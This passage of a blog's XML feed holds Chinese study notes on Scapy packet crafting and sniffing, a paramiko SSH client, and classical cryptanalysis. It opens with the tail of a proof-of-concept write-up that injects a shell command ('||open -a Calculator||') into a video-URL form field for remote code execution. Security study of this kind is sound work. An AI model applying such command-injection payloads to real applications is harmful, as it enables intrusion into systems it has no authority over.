package</p><p><img src="/../images/TheCommit/image-20230209185619622.png" alt="image-20230209185619622"></p><p>Send the package to <strong>Repeater</strong></p><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>change CutImageForm[video] like below</p><p><code>CutImageForm[video]=http%3A%2F%2Flocalhost%2Fattachment%2Fvideos%2F2023%2F02%2F09%2Fmeeting_04.mp4+||open+-a+Calculator+||</code></p><p>Calculator will be open</p>]]></content>
    
    
    <categories>
      
      <category>Scapy</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Scapy5</title>
    <link href="/posts/9a6f28cd.html"/>
    <url>/posts/9a6f28cd.html</url>
    
    <content type="html"><![CDATA[<h2 id="HTTPS中间人攻击"><a href="#HTTPS中间人攻击" class="headerlink" title="HTTPS中间人攻击"></a>HTTPS中间人攻击</h2><p><a href="https://zhuanlan.zhihu.com/p/43789231">HTTPS加密过程</a>，这个网站讲的很清楚。<br>我们进行HTTPS中间人攻击时，证书没被认证，浏览器会给客户端警告。在客户端点接受风险，才能继续攻击。或者控制客户端电脑认证我们的证书。<br>利用<strong>mitmproxy</strong></p><h2 id="python实现SSH"><a href="#python实现SSH" class="headerlink" title="python实现SSH"></a>python实现SSH</h2><p>先安装bcrypt，再安装paramiko</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">pip install bcrypt==3.1.7<br>pip install paramiko<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> paramiko<br>ssh = paramiko.SSHClient()<br>ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())<br>ssh.load_system_host_keys()<br>ip=<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;IP:&quot;</span>)<br>port=<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;PORT:&quot;</span>)<br>username=<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;USERNAME:&quot;</span>)<br>passwd=<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;PASSWD:&quot;</span>)<br>ssh.connect(ip,port,username,passwd)<br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    cmd=<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;$&gt;&quot;</span>)<br>    <span class="hljs-keyword">if</span>(cmd==<span class="hljs-string">&#x27;q&#x27;</span>):<br>        <span class="hljs-keyword">break</span><br>        ssh.close()<br>    ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command(cmd,get_pty=<span class="hljs-literal">True</span>)<br>    content = ssh_stdout.read().decode()<br>    <span class="hljs-keyword">if</span>(content!=<span class="hljs-string">&#x27;&#x27;</span>):<br>        <span class="hljs-built_in">print</span>(content,end=<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure><p>要执行多个，只能在一行写，中间用分号隔开。然后我又改进了一下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> paramiko<br>ssh = paramiko.SSHClient()<br>ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())<br>ssh.load_system_host_keys()<br>ip=<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;IP:&quot;</span>)<br>port=<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;PORT:&quot;</span>)<br>username=<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;USERNAME:&quot;</span>)<br>passwd=<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;PASSWD:&quot;</span>)<br>ssh.connect(ip,port,username,passwd)<br>cd=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    cmd=<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;$&gt;&quot;</span>)<br>    <span class="hljs-keyword">if</span>(cmd==<span class="hljs-string">&#x27;q&#x27;</span>):<br>        <span class="hljs-keyword">break</span><br>        ssh.close()<br>    ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command(cd+cmd,get_pty=<span class="hljs-literal">True</span>)<br>    content = ssh_stdout.read().decode()<br>    <span class="hljs-keyword">if</span>(content!=<span class="hljs-string">&#x27;&#x27;</span>):<br>        <span class="hljs-built_in">print</span>(content,end=<span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;cd&quot;</span> <span class="hljs-keyword">in</span> cmd:<br>        cd+=cmd+<span class="hljs-string">&#x27;;&#x27;</span><br></code></pre></td></tr></table></figure><p>把切换目录的命令保存在变量cd中，使用时可以正常用，感觉不错。<br><img src="https://img-blog.csdnimg.cn/86329202fc2540b89e404b671880aaa0.png"></p>]]></content>
    
    
    <categories>
      
      <category>Scapy</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>密码学原理与实践6</title>
    <link href="/posts/a53dad3e.html"/>
    <url>/posts/a53dad3e.html</url>
    
    <content type="html"><![CDATA[<h2 id="密码分析"><a href="#密码分析" class="headerlink" title="密码分析"></a>密码分析</h2><p><img src="https://img-blog.csdnimg.cn/d657905dd4044cc3a37f89c73a5f8fda.png"></p><h3 id="仿射密码和代换密码的密码分析"><a href="#仿射密码和代换密码的密码分析" class="headerlink" title="仿射密码和代换密码的密码分析"></a>仿射密码和代换密码的密码分析</h3><p>这两个密码的分析，首先是根据字母出现的频率，结合上图进行猜测，多考虑两三个字母的组合频率，减少分析量。</p><h3 id="维吉尼亚密码的密码分析"><a href="#维吉尼亚密码的密码分析" class="headerlink" title="维吉尼亚密码的密码分析"></a>维吉尼亚密码的密码分析</h3><p>利用Kasiski测试法，搜索长度至少为三的相同的密文段，得到他们之间的距离。m（密钥长度）一般为距离的最小公倍数。<br>然后用重合指数法进一步确定m<br>$$<br>文章中任意选取两个字母，设这两个字母相同的概率为p_i<br>根据统计，26个字母的(p_i)^2相加一般为0.065。<br>$$</p><p>维吉尼亚密码加密是</p><p><img src="https://img-blog.csdnimg.cn/b2a61e68d7f84af09b662ad5a8571db0.png"><br>$$<br>通过Kasiski测试法得到密钥长度为m，密文元素第1个和第km+1是经过同一密钥处理的，<br>$$</p><p>我们照这样把经过同一密钥处理的密文元素放在一起。<br><img src="https://img-blog.csdnimg.cn/4d33bc08480d467fbf0265192d2d565c.png"><br>在每一组里面猜密钥，然后用重合指数法验证密钥是否正确。可能因为每组太短，统计法不行。怎么用重合指数法验证呢？<br><img src="https://img-blog.csdnimg.cn/faaa2d81cbf7441394e5a696f13d3462.png"><br>$$<br>他用前面统计表已知的每个字母频率的p_i乘以当前这个加密后的字母的出现的概率。\<br>如果p_i和这个概率相等，就等于(p_i)^2，累加就能等于0.065。g是密钥。<br>$$</p><h3 id="希尔密码的密码分析"><a href="#希尔密码的密码分析" class="headerlink" title="希尔密码的密码分析"></a>希尔密码的密码分析</h3><p>书中写的是知道密文和原文的攻击，求密钥矩阵就行了</p><h3 id="LFSR流密码的密码分析"><a href="#LFSR流密码的密码分析" class="headerlink" title="LFSR流密码的密码分析"></a>LFSR流密码的密码分析</h3><p>下面这个生成公式是固定条件，所以解密很简单<br><img src="https://img-blog.csdnimg.cn/6b2fd903fbe941abb543e51bc82e582f.png"></p><p>得到密钥11010 01000 01010，且假定知道m为5<br><img src="https://img-blog.csdnimg.cn/c01aa83f325442edb0b60624c75146ab.png"><br>画的圈形象表示上面的正在流走，下面在不断生成，我们这样理解可以很快写出这个矩阵。</p><p>知道m为5，把密钥前面5个写第一列，第二列去掉第一个表示流掉，后面加上得到密钥的第六位。</p><p>后面以此类推。直到我们把矩阵写完，还没有利用完得到的密钥。最后求矩阵就行了。<br><img src="https://img-blog.csdnimg.cn/7517342b192c499daaa1022d2b858c59.png"><br>$$<br>上面结论是把c_i代入下面得到的<br>$$</p><p><img src="https://img-blog.csdnimg.cn/8424fa9b713c452fa8ff5d2fa946ef81.png"></p>]]></content>
    
    
    <categories>
      
      <category>密码学原理与实践（第三版）</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Scapy4</title>
    <link href="/posts/ed68185b.html"/>
    <url>/posts/ed68185b.html</url>
    
    <content type="html"><![CDATA[<p>DHCP数据包包括DHCP协议、BOOTP协议、UDP协议、IP协议、Ether协议，所以需要构造好这些。<br><img src="https://img-blog.csdnimg.cn/b3542efb049f46d3b6d41fb9b0128628.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">ls(BOOTP)<span class="hljs-comment">#显示BOOTP可以设置的值</span><br></code></pre></td></tr></table></figure><pre><code class="hljs">op         : ByteEnumField                       = (&#39;1&#39;)htype      : ByteField                           = (&#39;1&#39;)hlen       : ByteField                           = (&#39;6&#39;)hops       : ByteField                           = (&#39;0&#39;)xid        : IntField                            = (&#39;0&#39;)secs       : ShortField                          = (&#39;0&#39;)flags      : FlagsField                          = (&#39;&lt;Flag 0 ()&gt;&#39;)ciaddr     : IPField                             = (&quot;&#39;0.0.0.0&#39;&quot;)yiaddr     : IPField                             = (&quot;&#39;0.0.0.0&#39;&quot;)siaddr     : IPField                             = (&quot;&#39;0.0.0.0&#39;&quot;)giaddr     : IPField                             = (&quot;&#39;0.0.0.0&#39;&quot;)chaddr     : Field                               = (&quot;b&#39;&#39;&quot;)sname      : Field                               = (&quot;b&#39;&#39;&quot;)file       : Field                               = (&quot;b&#39;&#39;&quot;)options    : StrField                            = (&quot;b&#39;&#39;&quot;)</code></pre><p>我们需要设置xid（事务ID，区分是否是自己发的包）、chaddr（和Ether协议的源MAC相同）</p>]]></content>
    
    
    <categories>
      
      <category>Scapy</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>密码学原理与实践5</title>
    <link href="/posts/3c34fc84.html"/>
    <url>/posts/3c34fc84.html</url>
    
    <content type="html"><![CDATA[<h2 id="流密码"><a href="#流密码" class="headerlink" title="流密码"></a>流密码</h2><p>最简单的流密码是其密钥流直接由初始密钥使用特定算法变换得来，密钥流和明文串是相互独立的。这种类型的流密码称为<strong>同步流密码</strong>，正式定义如下：<br><img src="https://img-blog.csdnimg.cn/fafefc0f05c146adbdf19fe103d36e5e.png"><br>$$<br>初始密钥为\mathcal{K}，通过\mathcal{g}生成密钥流\mathcal{L}，然后我们用\mathcal{L}中的密钥一个个加密。\mathcal{L}是有限集，z_i是集合中的元素，z_i和z_j可以重复。<br>$$</p><p><img src="https://img-blog.csdnimg.cn/6340a42ab0fe4b369c012a0bb6caa559.png"><br>$$<br>它这个周期条件是c_i选择得当。因为上面是mod2，\<br>所以z_i只有两种状态：0或者1，z总共m个，所以遍历所有情况（选择得当情况下)，\<br>总共有2^m-1种，所有周期等于2^m-1<br>$$</p><h2 id="移位寄存器"><a href="#移位寄存器" class="headerlink" title="移位寄存器"></a>移位寄存器</h2><p><a href="https://wenku.baidu.com/view/9b16b9064873f242336c1eb91a37f111f1850dcb.html">参考资料</a><br><img src="https://img-blog.csdnimg.cn/de2d9d082f4a4f1196e27569083e0f47.png"><br><img src="https://img-blog.csdnimg.cn/044c5a7c374a48da994e57992c971963.png"><br>数字的移位寄存器利用模2加法（异或）产生密钥流<br><img src="https://img-blog.csdnimg.cn/45cfd36bd606467cacaee233b60cd19b.png">如果密钥流不仅跟密钥<strong>K</strong>有关，还跟明文元素或密文元素有关，这种类型的流密码称为<strong>异步流密码</strong>。<br><img src="https://img-blog.csdnimg.cn/f8794595322d4e4fa49774e92412f4e0.png"><br>$$<br>它总共密钥流第一位等于K，第i位等于原文第i-1位(i\geq 2)<br>$$</p>]]></content>
    
    
    <categories>
      
      <category>密码学原理与实践（第三版）</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>密码学原理与实践4</title>
    <link href="/posts/4b33cc12.html"/>
    <url>/posts/4b33cc12.html</url>
    
    <content type="html"><![CDATA[<h2 id="维吉尼亚密码"><a href="#维吉尼亚密码" class="headerlink" title="维吉尼亚密码"></a>维吉尼亚密码</h2><p>一旦密钥被选定，每个字母对应的数字都被加密变换成对应的惟一的数字，这种密码体制称为<strong>单表代换密码</strong>。<br>维吉尼亚密码是一种多表代换密码<br><img src="https://img-blog.csdnimg.cn/30a57033cdd24ec3bc897559e41b4fe5.png"><br>$$<br>加密是把\mathcal{P}和\mathcal{K}中对应的元素相加，即p_i-k_i<br>$$</p><p>解密相反</p><h2 id="希尔密码"><a href="#希尔密码" class="headerlink" title="希尔密码"></a>希尔密码</h2><p>$$<br>\mathcal{P}&#x3D;\mathcal{C}&#x3D;(\mathbb{Z}<em>{26})^m\<br>为什么是(\mathbb{Z}</em>{26})^m，因为可以表示多个组合\<br>每个组合的每个元素都在一个\mathbb{Z}_{26}中，前面的维吉尼亚密码也是这样的。\<br>\mathcal{P}、\mathcal{C}、\mathcal{K}，以矩阵形式进行计算，例子如下<br>$$</p><p><img src="https://img-blog.csdnimg.cn/594bdeb2ea4f43579177b1540502b0b2.png"></p><p>$$<br>x_1\times k_{1,2}中，k_{1,2}的1表示x_1，它的2表示y_2，就是k第一个下标表示加密哪个原文元素，\<br>第二个表示得到密文的哪个元素（的一部分，因为要多个加起来才是密文的一个元素)<br>$$</p><h2 id="密钥K可逆是完成解密的必要条件"><a href="#密钥K可逆是完成解密的必要条件" class="headerlink" title="密钥K可逆是完成解密的必要条件"></a>密钥K可逆是完成解密的必要条件</h2><p>可能还要其他其他条件。如果密钥这个矩阵不可逆就会不可解密，如果密钥的秩还小于原文矩阵的秩，它的密文的秩会比原文小。因为两个矩阵相乘，得到的矩阵的秩等于两个的矩阵中的最小秩。<br>符合哈希算法特点：散列值的空间通常远小于输入的空间。这应该也算一种哈希算法<br><strong>线性代数基础跳过了</strong></p><h2 id="置换密码"><a href="#置换密码" class="headerlink" title="置换密码"></a>置换密码</h2><p><img src="https://img-blog.csdnimg.cn/1dc7a98c2c3e42058b6bc32487a897bd.png"></p><p>先分组，再每个组按照固定密钥打乱每组的元素。<br>$$<br>置换密码是一种希尔密码，\mathcal{P}、\mathcal{C}、\mathcal{K}都可以看成矩阵，解密就求逆矩阵。<br>$$</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>密码学原理与实践3</title>
    <link href="/posts/d55759b1.html"/>
    <url>/posts/d55759b1.html</url>
    
    <content type="html"><![CDATA[<p>$$<br>因为26&#x3D;2\times 13，根据下文提到的欧拉函数\phi(m)计算得到所以与26互素的数的个数为12\<br>仿射密码的密钥空间等于a\times b<br>$$</p><p><img src="https://img-blog.csdnimg.cn/c036f749190d43f3a9773ee34724839b.png"><br><img src="https://img-blog.csdnimg.cn/b846d6949a524c90b858876171fb20bd.png"></p><p><a href="https://zhuanlan.zhihu.com/p/37067555">定理1.2的证明</a>，我觉得这个讲的好<br>$$<br>我们计算一下\phi(26)\<br>因为26&#x3D;2\times 13，p<del>1</del>&#x3D;2，e<del>1</del>&#x3D;1，p<del>2</del>&#x3D;13，e<del>2</del>&#x3D;1\<br>\phi(26)&#x3D;[(p_1)^1-(p_1)^{1-1}][(p_2)^1-(p_2)^{1-1})]&#x3D;12\<br>仿射密码的密钥空间大小是m\phi(m)<br>$$</p><p><img src="https://img-blog.csdnimg.cn/2b6a286915394e1580cb8201292442d1.png"><br><img src="https://img-blog.csdnimg.cn/334e65d6602347b4ba80174404be53ef.png"></p>]]></content>
    
    
    <categories>
      
      <category>密码学原理与实践（第三版）</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Scapy3</title>
    <link href="/posts/730c8df8.html"/>
    <url>/posts/730c8df8.html</url>
    
    <content type="html"><![CDATA[<h2 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">sniff(<span class="hljs-built_in">filter</span>=<span class="hljs-string">&quot;&quot;</span>,iface=<span class="hljs-string">&quot;any&quot;</span>,prn=function,count=N)<br><span class="hljs-comment">#filter过滤器</span><br><span class="hljs-comment">#iface网卡</span><br><span class="hljs-comment">#prn调用函数</span><br><span class="hljs-comment">#count监听数量</span><br></code></pre></td></tr></table></figure><h3 id="filter"><a href="#filter" class="headerlink" title="filter"></a>filter</h3><p>filter采用伯克利包过滤的方法，该方法有三种限定符：Type（对象，默认为host）、Dir（传输方向）、Proto（协议）。</p><pre><code class="hljs">host 192.168.1.1过滤目的IP地址或者源地址为192.168.1.1的数据包dst host 192.168.1.1src host 192.168.1.1过滤目的（源）地址为192.168.1.1的数据包ether host aa:aa:aa:aa:aa:aa过滤目的MAC地址或者源地址为aa:aa:aa:aa:aa:aa的数据包ether dst aa:aa:aa:aa:aa:aaether src aa:aa:aa:aa:aa:aa过滤目的（源）MAC地址为aa:aa:aa:aa:aa:aa的数据包dst net 192.168.1.0/24src net 192.168.1.0/24过滤IPv4的目的（源）地址为192.168.1.0/24这个范围的数据包net 192.168.1.0/24dst port 8080src port 8080过滤TCP或者UDP且目的（源）端口是8080的数据包port 8080</code></pre><h3 id="iface"><a href="#iface" class="headerlink" title="iface"></a>iface</h3><p>iface用来指定要使用的网卡，默认为上网使用的网卡<br>Linux下使用<code>ip addr</code>或者<code>ifconfig</code>来查看网卡<br>lo和eth0就是网卡，正常选择eth0<br>Windows使用<code>ipconfig</code>查看<br>如果连接的是wifi，选择WLAN<br>有线可能要选择一下本地连接* 1之类的</p><h3 id="prn"><a href="#prn" class="headerlink" title="prn"></a>prn</h3><p>prn表示对捕获的包进行处理的函数的名字（回调函数）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">packet_callback</span>(<span class="hljs-params">pkt</span>):<br><span class="hljs-built_in">print</span>(pkt.summary)<br><br>sniff(prn=packet_callback)<br></code></pre></td></tr></table></figure><p>也可以用Lambda表达式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">sniff(<span class="hljs-built_in">filter</span>=<span class="hljs-string">&quot;icmp&quot;</span>,prn=<span class="hljs-keyword">lambda</span> x:x.summary())<br></code></pre></td></tr></table></figure><h3 id="count"><a href="#count" class="headerlink" title="count"></a>count</h3><p>count指定要监听数据包的数量</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">sniff(count=<span class="hljs-number">10</span>)<br></code></pre></td></tr></table></figure><h2 id="综合实例"><a href="#综合实例" class="headerlink" title="综合实例"></a>综合实例</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">sniff(<span class="hljs-built_in">filter</span>=<span class="hljs-string">&quot;icmp and host 192.168.1.1&quot;</span>,prn=<span class="hljs-keyword">lambda</span> x:x.summary(),count=<span class="hljs-number">50</span>)<br></code></pre></td></tr></table></figure><p>启动程序，在cmd里面ping一下就能看见打印的信息了</p><p>​<img src="https://img-blog.csdnimg.cn/044b980ab81f443c82843283de3ff7b6.png"><br>很小的概率会出错，监听到了超过四个数据包</p><p><img src="https://img-blog.csdnimg.cn/485640fe617f4e62935d7c67fcb6d8c2.png"></p>]]></content>
    
    
    <categories>
      
      <category>Scapy</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>密码学原理与实践2</title>
    <link href="/posts/a2506927.html"/>
    <url>/posts/a2506927.html</url>
    
    <content type="html"><![CDATA[<h2 id="信安数学基础学习"><a href="#信安数学基础学习" class="headerlink" title="信安数学基础学习"></a>信安数学基础学习</h2><p>$$<br>若 a 是 b 的倍数则记为 b\ |\ a\<br>一个比较不熟的定理\<br>若 a\ |\ b，b\ |\ a 则 a&#x3D;\pm b\<br>$$</p><h4 id="欧几里得除法"><a href="#欧几里得除法" class="headerlink" title="欧几里得除法"></a>欧几里得除法</h4><p>先证存在性，再证唯一性<br><img src="https://img-blog.csdnimg.cn/34b18d199d8e4375b24d74a9590f5abc.png"><br><img src="https://img-blog.csdnimg.cn/9b35f83aa47c4472a0e41b2bd9963dd0.png"><br>$$<br>因为q与q_{1}都是整数，所以它们相差的绝对值大于等于1，所以\lvert b(q-q_{1})\rvert \geq b\<br>根据r与r_{1}的范围可知\lvert r_{1} - r \rvert &lt; b，所以与b(q-q_{1})&#x3D;r_{1}-r矛盾。<br>$$<br><img src="https://img-blog.csdnimg.cn/c46f0d4fbd684976b3b8a87f147755be.png"></p><h2 id="密码学原理与实践学习"><a href="#密码学原理与实践学习" class="headerlink" title="密码学原理与实践学习"></a>密码学原理与实践学习</h2><h4 id="仿射密码"><a href="#仿射密码" class="headerlink" title="仿射密码"></a>仿射密码</h4><p>$$<br>移位密码和仿射密码是代换密码的一种特殊形式。仿射密码加密函数定义为\<br>e(x)&#x3D;(ax+b)mod26\<br>a,b \in\mathbb Z$<del>26</del>，当a&#x3D;1，就是移位密码<br>$$</p><p><img src="https://img-blog.csdnimg.cn/95560fd6f62840cd863a6089099c40f8.png"><br><img src="https://img-blog.csdnimg.cn/4d6d43221351431ea48dfb88503df791.png"><br>$$<br>为了解密，要保证仿射函数是一个单射函数，\<br>也就是ax\equiv y(mod26)中一个x对应一个y，\<br>一个x不能对应多个y，一个y不能对应多个x。\<br>书中写假设存在ax_{1}\equiv ax_{2}(mod26)，\<br>我先这样理解，\<br>就是说如果两个\mathcal{P}（不知道是否一样）经过同种加密后他们的\mathcal{C}一样，\<br>推出x_{1}\equiv x_{2}(mod26)这个结论，\<br>这两个\mathcal{P}在Z<del>26</del>中位置相同，即两个\mathcal{P}一样。\<br>达到证明它是单射函数的目的。\<br>单纯在数学上说就是假设ax_{1}\equiv ax_{2}(mod26)\<br>（把x_{1}当已知，x_{2}当未知）没有唯一解，即x_{1}\neq x_{2}，\<br>但是推出x_{1}\equiv x_{2}(mod26)与前面矛盾，所以只有唯一解。\<br>取ax\equiv y(mod26)中ax第i个值为ax_{i}，\<br>由上面有唯一解证明知不存在ax_{i}与ax_{j}在\mathbb Z<del>26</del>中位置相同\<br>（如果相同，ax_{i}\equiv ax_{2}(mod26)中，\<br>x_{2}$可以取$x_{i}和x_{j}，就与唯一解矛盾，\<br>所以x_{2}只能取x_{i}）最后得到上面的证明。<br>$$<br>下面重新叙述这个命题（定理）<br><img src="https://img-blog.csdnimg.cn/980fc2c493134f9f871fc0ef60c1cf5b.png"></p>]]></content>
    
    
    <categories>
      
      <category>密码学原理与实践（第三版）</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Scapy2</title>
    <link href="/posts/40bbd6e.html"/>
    <url>/posts/40bbd6e.html</url>
    
    <content type="html"><![CDATA[<h2 id="ls-查看包的结构"><a href="#ls-查看包的结构" class="headerlink" title="ls()查看包的结构"></a>ls()查看包的结构</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br>pkt = Ether()/IP()/TCP()<br>ls(pkt)<br></code></pre></td></tr></table></figure><pre><code class="hljs">dst        : DestMACField                        = &#39;ff:ff:ff:ff:ff:ff&#39; (&#39;None&#39;)src        : SourceMACField                      = &#39;00:00:00:00:00:00&#39; (&#39;None&#39;)type       : XShortEnumField                     = 2048            (&#39;36864&#39;)--version    : BitField  (4 bits)                  = 4               (&#39;4&#39;)ihl        : BitField  (4 bits)                  = None            (&#39;None&#39;)tos        : XByteField                          = 0               (&#39;0&#39;)len        : ShortField                          = None            (&#39;None&#39;)id         : ShortField                          = 1               (&#39;1&#39;)flags      : FlagsField                          = &lt;Flag 0 ()&gt;     (&#39;&lt;Flag 0 ()&gt;&#39;)frag       : BitField  (13 bits)                 = 0               (&#39;0&#39;)ttl        : ByteField                           = 64              (&#39;64&#39;)proto      : ByteEnumField                       = 6               (&#39;0&#39;)chksum     : XShortField                         = None            (&#39;None&#39;)src        : SourceIPField                       = &#39;127.0.0.1&#39;     (&#39;None&#39;)dst        : DestIPField                         = &#39;127.0.0.1&#39;     (&#39;None&#39;)options    : PacketListField                     = []              (&#39;[]&#39;)--sport      : ShortEnumField                      = 20              (&#39;20&#39;)dport      : ShortEnumField                      = 80              (&#39;80&#39;)seq        : IntField                            = 0               (&#39;0&#39;)ack        : IntField                            = 0               (&#39;0&#39;)dataofs    : BitField  (4 bits)                  = None            (&#39;None&#39;)reserved   : BitField  (3 bits)                  = 0               (&#39;0&#39;)flags      : FlagsField                          = &lt;Flag 2 (S)&gt;    (&#39;&lt;Flag 2 (S)&gt;&#39;)window     : ShortField                          = 8192            (&#39;8192&#39;)chksum     : XShortField                         = None            (&#39;None&#39;)urgptr     : ShortField                          = 0               (&#39;0&#39;)options    : TCPOptionsField                     = []              (&quot;b&#39;&#39;&quot;)</code></pre><h2 id="使用lsc-查看scapy支持的函数"><a href="#使用lsc-查看scapy支持的函数" class="headerlink" title="使用lsc()查看scapy支持的函数"></a>使用lsc()查看scapy支持的函数</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">lsc()<br></code></pre></td></tr></table></figure><h2 id="raw-以字节格式显示数据包内容"><a href="#raw-以字节格式显示数据包内容" class="headerlink" title="raw()以字节格式显示数据包内容"></a>raw()以字节格式显示数据包内容</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(raw(pkt))<br></code></pre></td></tr></table></figure><pre><code class="hljs">b&#39;\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00\x08\x00E\x00\x00(\x00\x01\x00\x00@\x06|\xcd\x7f\x00\x00\x01\x7f\x00\x00\x01\x00\x14\x00P\x00\x00\x00\x00\x00\x00\x00\x00P\x02 \x00\x91|\x00\x00&#39;</code></pre><h2 id="hexdump-pkt-以类似wireshark的形式显示数据包"><a href="#hexdump-pkt-以类似wireshark的形式显示数据包" class="headerlink" title="hexdump(pkt)以类似wireshark的形式显示数据包"></a>hexdump(pkt)以类似wireshark的形式显示数据包</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(hexdump(pkt))<br></code></pre></td></tr></table></figure><pre><code class="hljs">0000  FF FF FF FF FF FF 00 00 00 00 00 00 08 00 45 00  ..............E.0010  00 28 00 01 00 00 40 06 7C CD 7F 00 00 01 7F 00  .(....@.|.......0020  00 01 00 14 00 50 00 00 00 00 00 00 00 00 50 02  .....P........P.0030  20 00 91 7C 00 00                                 ..|..None</code></pre><h2 id="pkt-summary-简洁显示数据包"><a href="#pkt-summary-简洁显示数据包" class="headerlink" title="pkt.summary()简洁显示数据包"></a>pkt.summary()简洁显示数据包</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(pkt.summary())<br></code></pre></td></tr></table></figure><pre><code class="hljs">Ether / IP / TCP 127.0.0.1:ftp_data &gt; 127.0.0.1:http S</code></pre><h2 id="print-pkt-show-以展开图形式显示数据包"><a href="#print-pkt-show-以展开图形式显示数据包" class="headerlink" title="print(pkt.show())以展开图形式显示数据包"></a>print(pkt.show())以展开图形式显示数据包</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">pkt.show()<br></code></pre></td></tr></table></figure><pre><code class="hljs">###[ Ethernet ]###   dst       = ff:ff:ff:ff:ff:ff  src       = 00:00:00:00:00:00  type      = IPv4###[ IP ]###      version   = 4     ihl       = None     tos       = 0x0     len       = None     id        = 1     flags     =      frag      = 0     ttl       = 64     proto     = tcp     chksum    = None     src       = 127.0.0.1     dst       = 127.0.0.1     \options   \###[ TCP ]###         sport     = ftp_data        dport     = http        seq       = 0        ack       = 0        dataofs   = None        reserved  = 0        flags     = S        window    = 8192        chksum    = None        urgptr    = 0        options   = &#39;&#39;None</code></pre><h2 id="数据包读写"><a href="#数据包读写" class="headerlink" title="数据包读写"></a>数据包读写</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">wrpcap(<span class="hljs-string">&quot;temp.cap&quot;</span>,pkt)<span class="hljs-comment">#将数据包写入temp.cap</span><br>pkts = rdpcap(<span 